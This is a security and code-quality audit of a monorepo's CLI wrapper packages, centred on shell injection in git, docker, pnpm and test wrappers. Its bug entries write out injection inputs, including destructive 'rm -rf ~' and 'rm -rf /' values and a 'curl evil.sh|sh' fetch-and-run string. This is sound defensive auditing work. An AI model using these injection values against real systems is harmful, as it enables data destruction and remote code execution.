# CLI Wrapper Layer Audit

Scope: client-shell, client-git, client-pnpm, client-docker, client-cli, client-node, client-vite, client-vitest, client-test, test, client-procedure, client-playground. Read-only. All 12 packages build via `tsc -b`; all have committed `dist/`.

## Package summaries

### client-shell — Grade: B
- **Purpose:** Foundation primitive. Three procedures every wrapper is *supposed* to shell through.
- **Procedures:** `shell.run` (spawn, `shell:false`, argv array — injection-safe), `shell.exec` (`child_process.exec`, `shell:true` — runs raw strings), `shell.which` (`where`/`which`).
- **Conformance:** N/A (it's the base). Design is sound: `run` is the safe argv path, `exec` is the deliberate shell-string path.
- **Build/test:** Builds. No tests.
- **Notes:** `shell.run` accumulates stdout/stderr unbounded (no `maxBuffer`); decodes per-chunk (`data.toString(encoding)` at run.ts:26,30) so multi-byte chars split across chunk boundaries corrupt; timeout kills but the signal is never surfaced in `ShellRunOutput` (only `exec` returns `signal`). `env` merge and `cwd` handling correct. Windows-safe via `windowsHide`.

### client-git — Grade: D
- **Purpose:** Git as 26 procedures.
- **Procedures (26):** status, add, commit, push, pull, clone, checkout, branch, log, diff, init, remote, fetch; predicates hasChanges/hasStagedChanges/hasUnstagedChanges/hasUntrackedFiles/hasLocalCommits/isClean; stash list/push/pop/apply/drop/export/import.
- **Conformance:** **Diverges hardest.** Does not use client-shell at all — every procedure calls `execSync()` directly with **string interpolation** of user input. This both violates the documented layering (CLAUDE.md: "Uses client-shell to execute CLI commands") and creates pervasive shell-injection (see Bugs 1–6). Its own README (line 12) admits "wraps Git commands directly (not through client-shell)" — honest, but contradicts the ecosystem architecture and the client-shell dependency diagram.
- **Build/test:** Builds. **No test script at all** despite being the most dangerous package. Stale `src/register.ts.bak` committed (older 12-procedure version with an inlined `zodAdapter`).
- **Destructive ops exposed:** `push --force` (push.ts:34), `branch -d`. No `reset --hard`/`clean` exposed (good). Force-push is a plain boolean flag with no guard.

### client-pnpm — Grade: C
- **Purpose:** pnpm wrapper.
- **Procedures:** pnpm.install, add, remove, link, run, store.path.
- **Conformance:** Diverges from "one generalized procedure" (6 hand-written). Correctly routes through `shell.exec`, but builds the command by `["pnpm", ...args].join(" ")` with **zero quoting** — injection via package names/script args (Bug 8). `store.path` uses its own `execSync` + `existsSync`.
- **Build/test:** Builds. No tests.

### client-docker — Grade: C
- **Purpose:** Docker wrapper.
- **Procedures:** docker.run, build, pull, exec, stop, rm, ps, logs, compose.up, compose.down.
- **Conformance:** Diverges (10 procedures). Routes through `shell.exec`, again `join(" ")` with no quoting (Bug 7). `docker.run`/`docker.exec` do `input.command.split(" ")` (run.ts:62, exec.ts:34) which shreds any quoted/spaced command.
- **Build/test:** Builds. **Only package with tests** (3 files). Unit tests mock `shell.exec` and assert `command` *contains* `"docker run"`, `"--name my-nginx"`, etc. — i.e. they lock in the unquoted string-concat behavior. Integration tests gated on `isDockerAvailable()`. No `vitest.config.ts` (relies on vitest defaults).

### client-cli — Grade: B
- **Purpose:** Wraps the `mark` CLI itself.
- **Procedures:** `cli.run` — single generalized, path-based input.
- **Conformance:** **Best conformance to the documented pattern.** One procedure; falls back to `shell.run` (argv array — injection-safe). Also has a server-execution fast path via `~/.mark/server.lock`.
- **Issues:** Hardcodes relative `node cli/dist/index.js` (run.ts:119) — breaks unless `cwd` is the workspace root. `buildProcedureInput` blindly maps first positional to `name` and dumps extras into `_positional` (run.ts:66-72) — wrong for procedures whose first positional isn't `name`. package.json `description` says "cli.exec" (there is no cli.exec).
- **Build/test:** Builds. No tests.

### client-node — Grade: B
- **Purpose:** Long-running Node process management.
- **Procedures:** node.run, node.spawn, node.kill, node.status.
- **Conformance:** Not a CLI wrapper per se; uses `spawn("node", [script, ...args])` argv arrays (safe). Clean `ProcessManager` singleton.
- **Issue:** Singleton state lives in-process, so `spawn`→`kill`/`status` only works within one long-lived process (server mode); across separate CLI invocations a returned `processId` is unresolvable. `node.run` timeout **rejects** the promise (run.ts:30) rather than resolving with a result, unlike `shell.run`.
- **Build/test:** Builds. No tests.

### client-vite — Grade: C+
- **Purpose:** Vite dev-server lifecycle.
- **Procedures:** vite.dev, vite.build, vite.preview, vite.stop.
- **Conformance:** Uses `spawn("npx", args, { shell: true })` — `shell:true` with an args array is a Windows footgun and a mild injection vector via `host` (dev.ts:17-21). `waitForReady` only matches `/Local:\s+(https?...)/` — vite-specific, brittle. Same cross-process singleton limitation as client-node.
- **Build/test:** Builds. No tests.

### client-vitest — Grade: C-
- **Purpose:** vitest.run / vitest.watch.
- **Conformance:** `spawn("npx", args, { shell: true })`. **Implementation ignores half its own schema:** `input.reporter` and `input.watch` are declared but unused (run.ts hardcodes `--reporter json` and `run`); `coverage` output object is typed but never populated even when `--coverage` is passed. `shorts` map is **inverted** vs every other package: `{ c: "coverage" }` instead of `{ coverage: "c" }` (register.ts:24). `args` meta uses array-of-objects while every other package uses array-of-strings.
- **Build/test:** Builds. No tests. **Cruft:** `write-files.cjs`, `write-register.cjs`, `write-types.cjs`, `README_NEW.md` committed.

### client-test — Grade: D+
- **Purpose:** test.run / test.coverage.
- **Conformance:** Routes through `shell.exec` but invokes **bare `vitest`** (`args.join(" ")`, run.ts:17-42) — `shell.exec` does not add `node_modules/.bin` to PATH, so this likely fails with ENOENT where client-vitest's `npx vitest` succeeds. `test.run` with `watch:true` runs `vitest` (no `run`) through the blocking `shell.exec` → **hangs forever**. Overlaps client-vitest almost entirely.
- **Build/test:** Builds. No tests. `README_NEW.md` cruft.

### test — Grade: B
- **Purpose:** Shared test *library* (not procedures): `createTempDir`, `writePackageJson`, `initGitRepo`, mock re-exports, `waitFor`/`sleep`/`assertThrows`, and `sharedConfig` vitest preset.
- **Conformance:** N/A — registers no procedures, so it does **not** overlap client-test/client-vitest at the procedure layer (it's the fixtures/mocks/config layer beneath test authoring). Naming (`test` vs `client-test`) is confusing.
- **Build/test:** Builds. Has `test` script but no `*.test.ts` in `src` → `vitest run` finds nothing.

### client-procedure — Grade: C+
- **Purpose:** Meta-procedures. `procedure.new` (scaffolder), `procedure.list/get/export` (registry introspection via `PROCEDURE_REGISTRY`).
- **Conformance:** Registry procedures are clean. `procedure.new` orchestrates `fs.*` procedures. Has a real dryRun bug (Bug 12) and its success path prints a **manual** "add registration to register.ts" reminder — which contradicts CLAUDE.md's promise that the CLI fully scaffolds procedures.
- **Build/test:** Builds. No tests.

### client-playground — Grade: B
- **Purpose:** Type-safe fluent builder (`proc`/`ref`/`run`) for composing procedure aggregations, executed via `LocalTransport`.
- **Conformance:** Not a wrapper; self-contained, no procedures registered. Clean.
- **Build/test:** Builds. No tests.

## Bugs

**1. git.commit — shell injection via commit message (CRITICAL, certain).**
`client-git/src/procedures/git/commit.ts:36-38`
```js
args.push("-m", `"${message.replace(/"/g, '\\"')}"`);
execSync(args.join(" "), opts);
```
Only escapes `"`. Inside a double-quoted string, POSIX command substitution still fires. Input `message: "$(touch pwned)"` → executes `touch pwned`. On Windows `cmd.exe`, `\"` is not an escape and `message: "x & calc"` runs calc. Concrete break: `client.call(["git","commit"],{message:"$(rm -rf ~)"})`.

**2. git.add — shell injection via paths (CRITICAL, certain).**
`client-git/src/procedures/git/add.ts:20`
```js
execSync(`git add -- ${paths.map(p => `"${p}"`).join(" ")}`, opts);
```
Naive `"…"` wrap. Input `paths: ['$(id>/tmp/x)']` → substitution runs; `paths: ['a"; rm -rf . ; "']` breaks out. Same pattern in `checkout.ts:22` and `diff.ts:22,54`.

**3. git.checkout — shell injection via ref (CRITICAL, certain).**
`client-git/src/procedures/git/checkout.ts:19,24` — `args.push(ref)` unquoted, then `execSync(args.join(" "))`. Input `ref: "main; rm -rf ~"` executes. `ref` is a required top-level arg.

**4. git.remote — shell injection via name/url (CRITICAL, certain).**
`client-git/src/procedures/git/remote.ts:20,23,29`
```js
execSync(`git remote set-url ${name} ${url}`, opts);
```
Both interpolated unquoted. Input `url: "x; curl evil.sh|sh"` executes.

**5. git.branch — shell injection via name (HIGH, certain).**
`client-git/src/procedures/git/branch.ts:22,28` — `git branch -d "${name}"` / `git branch "${name}"`. Input `name: '$(reboot)'` runs inside the quotes on POSIX.

**6. git.push / git.pull / git.clone / git.log / git.diff / git.init — injection via branch, remote, url, ref, initialBranch (HIGH, certain).**
`push.ts:24,35`, `pull.ts:26`, `clone.ts:25`, `log.ts:23`, `diff.ts:19`, `init.ts:35` all interpolate/append user strings unquoted into an `execSync(join(" "))`. E.g. `git.log` `ref: "HEAD; rm -rf ~"`; `git.init` `initialBranch: "x;calc"` → `--initial-branch=x;calc`.

**7. docker.* — shell injection via every string field (HIGH, certain).**
All docker procedures build `["docker", ...args].join(" ")` and pass to `shell.exec` (`shell:true`) with no quoting. `run.ts:66`, `build.ts:45`, `exec.ts:36`, `pull.ts:21`, etc. Input `image: "nginx; rm -rf /"` or `container: "$(id)"` executes. Additionally `run.ts:62`/`exec.ts:34` do `input.command.split(" ")`, so `command: 'sh -c "a b"'` is mis-split.

**8. pnpm.* / test.* — shell injection via package/script/pattern (MEDIUM, certain).**
`client-pnpm/src/procedures/pnpm/add.ts:33,40` (and install/remove/run) join unquoted into `shell.exec`. Input `packages: ['foo; rm -rf ~']` executes. Same class in `client-test/src/procedures/test/run.ts:38` and `coverage.ts:24` via `pattern`.

**9. client-test test.run — broken runner + watch hang (HIGH, likely).**
`client-test/src/procedures/test/run.ts:17,19-23,38-42`. Invokes bare `vitest` through `shell.exec`; `node_modules/.bin` is not on PATH under a raw shell, so this fails ENOENT where `npx vitest` would work. With `watch:true` it drops the `run` subcommand and blocks on `shell.exec` forever.

**10. client-vitest vitest.run — schema fields silently ignored (MEDIUM, certain).**
`client-vitest/src/procedures/vitest/run.ts`. `input.reporter`, `input.watch` declared in schema (types.ts:7,9) but never read; `--reporter json` and `run` are hardcoded. `coverage` output object (types.ts:28-33) is never populated even with `--coverage`. README claims verbose/JSON/JUnit reporters and line/branch/function/statement coverage — none delivered.

**11. client-vitest shorts map inverted (MEDIUM, certain).**
`client-vitest/src/register.ts:24` — `shorts: { c: "coverage" }`. Every other package uses `{ <long>: "<short> }` (e.g. `client-test/register.ts:28` `{ coverage: "c" }`). This registers a long-flag named `c` aliasing `coverage`, the reverse of the convention.

**12. procedure.new dryRun — Promise-truthiness filter bug (MEDIUM, certain).**
`client-procedure/src/procedures/procedure/new.ts:155-158`
```js
created: [procedureFile, namespaceIndex].filter((f) => !pathExists(f, ctx)),
modified: [typesFile, namespaceIndex].filter(async (f) => await pathExists(f, ctx)),
```
`pathExists` returns a Promise (always truthy): `!Promise` is always `false` → `created` always `[]`; the `async` predicate returns a Promise (always truthy) → `modified` always contains everything. dryRun output is meaningless.

**13. git.branch remote misclassification (MEDIUM, certain).**
`client-git/src/procedures/git/branch.ts:46` — `const isRemote = branchName.startsWith("remotes/") || branchName.includes("/")`. Any local branch with a slash (`feature/foo`, `release/1.0`) is wrongly flagged `remote:true`.

**14. git.diff unbounded execSync buffer (MEDIUM, likely).**
`client-git/src/procedures/git/diff.ts:56` — full-diff `execSync` uses default 1MB `maxBuffer` (unlike `stash.export` which sets 50MB at stash.ts:180). Any diff >1MB throws `ENOBUFS` and the whole procedure throws instead of returning.

**15. shell.run multi-byte corruption + unbounded memory (LOW, certain).**
`client-shell/src/procedures/shell/run.ts:26,30` — `data.toString(encoding)` per chunk splits multi-byte UTF-8 across chunk boundaries; no `maxBuffer` cap so large output can OOM. `shell.exec` handles both (Node buffers then decodes; `maxBuffer` supported).

## Architecture flaws

- **client-git bypasses the entire foundation.** It is the one wrapper that never touches client-shell; it reimplements execution with `execSync` + string interpolation. This is simultaneously the layering violation and the source of Bugs 1–6. Routing it through `shell.run` (argv) would eliminate the injection class outright.
- **Two execution idioms, inconsistently applied.** Safe argv path (`shell.run` / `spawn([...])`): client-cli, client-node. Unsafe shell-string path (`shell.exec` + `join(" ")` or raw `execSync`): client-git, client-pnpm, client-docker, client-test. The safe primitive exists and is documented as "safer" in the client-shell README, yet most wrappers pick the unsafe one and hand it unquoted input.
- **Duplicated command-builder boilerplate.** Every pnpm/docker/test procedure repeats the same block: build `args[]`, `["tool", ...args].join(" ")`, construct `shellInput`, copy `cwd`/`timeout`, `try/catch` → `{exitCode,stdout,stderr,success,duration}`. This 20-line skeleton is copy-pasted ~20 times with no shared helper (e.g. a `runCli(tool, args, {cwd,timeout})` in client-shell). A shared argv-based helper would also fix quoting everywhere at once.
- **"One generalized procedure per CLI tool" is followed only by client-cli.** git/pnpm/docker/vite/vitest/test all ship many hand-written per-subcommand procedures — the opposite of the documented pattern.
- **Three overlapping test surfaces.** `client-test` (test.run/coverage via shell.exec, bare `vitest`) and `client-vitest` (vitest.run/watch via `npx vitest`) do nearly the same job with different, both-partly-broken implementations; the `test` package is a differently-scoped fixtures/mocks library but the name collision compounds the confusion. Pick one procedure surface.
- **In-process singletons for process/server lifecycle** (client-node `processManager`, client-vite `serverManager`) only function under a persistent server; under one-shot CLI invocations, spawn/kill/status can't correlate. Not wrong given server mode exists, but undocumented as a constraint.
- **`shorts`/`args` meta shape is unstandardized** — array-of-strings vs array-of-objects, and at least one inverted map (Bug 11). No shared type is enforcing the meta contract.

## Doc drift

- **client-shell README** shows the canonical wrapper example as `gitStatus` calling `ctx.client.call(["shell","run"], …)` (README.md:270-282) and draws `Git --> Shell` in the dependency tree. Reality: client-git calls `execSync` and depends only on `client` + `zod` (no client-shell dep). The README's own comparison table advertises `shell.run` as handling platform quoting "safer" — true, but the wrappers don't use it.
- **client-git README** claims "23 procedures" (README.md:10,39) — actual count is **26** (13 core + 6 predicates + 7 stash). Also lists `init` under both "Repository State" and "Remote Operations."
- **client-cli package.json** `description` = "exposes cli.exec procedure" — there is no `cli.exec`; the procedure is `cli.run` (the README gets this right). The README's data-flow diagram also omits the server/lockfile execution path that the code implements.
- **client-vitest README** advertises "Multiple Reporters - Default, verbose, JSON, and JUnit" and full line/branch/function/statement "Coverage Reports." The implementation hardcodes `--reporter json` and never returns coverage (Bug 10).
- **CLAUDE.md** states CLI wrappers "Use client-shell to execute CLI commands" and that `procedure new` "scaffolds procedure files correctly" — yet client-git ignores client-shell, and `procedure.new` ends by telling the user to hand-edit `register.ts`.
- **Cruft:** `client-git/src/register.ts.bak`; `client-vitest/{write-files,write-register,write-types}.cjs` + `README_NEW.md`; `client-test/README_NEW.md`.

## Roadmap candidates (prioritized)

1. **Kill the injection class in client-git (highest).** Convert all `execSync(join(" "))` calls to argv execution — either `spawnSync("git", argvArray)` or route through `shell.run`. This closes Bugs 1–6 (all CRITICAL/HIGH) in one package and restores the documented layering. Remove the `"…"` hand-quoting entirely.
2. **Fix the shell-string wrappers (pnpm, docker, test).** Switch from `shell.exec` + `join(" ")` to `shell.run` with argv arrays (client-cli is the template). Closes Bugs 7–9. Remove `command.split(" ")` in docker.run/exec.
3. **Introduce a shared `runCli` helper in client-shell** that takes `(command, args[], {cwd,env,timeout})`, calls `shell.run`, and returns the standard `{exitCode,stdout,stderr,success,duration}`. Refactor pnpm/docker/test/vite/vitest onto it — deletes ~400 lines of duplicated try/catch/build blocks and makes safe-by-default the path of least resistance.
4. **Consolidate the test story.** Deprecate one of client-test / client-vitest; make the survivor honor its own schema (reporter, watch, coverage), use `npx vitest`, and never block on watch. Fix the inverted `shorts` (Bug 11).
5. **Guard destructive git ops.** Require an explicit confirmation flag (or context capability) for `push --force`; consider the same before exposing anything like reset/clean later.
6. **Correctness fixes:** git.branch remote detection (Bug 13); git.diff `maxBuffer` (Bug 14); procedure.new dryRun filters (Bug 12); shell.run buffering/encoding + timeout-signal surfacing (Bug 15).
7. **Doc + hygiene sweep:** correct client-git procedure count, client-cli `cli.exec`→`cli.run` description, client-vitest reporter/coverage claims, client-shell README wrapper example; delete `.bak`, `write-*.cjs`, `README_NEW.md`. Add a note that node/vite process-management procedures require server mode.
8. **Standardize procedure `meta`** (`args`/`shorts`) with a shared TypeScript type so inversions and shape drift fail at compile time.

Highest-severity items are all in **client-git** (raw `execSync` string interpolation across 26 procedures, no tests). client-cli and client-node are the models to copy: single/argv-based, injection-safe.
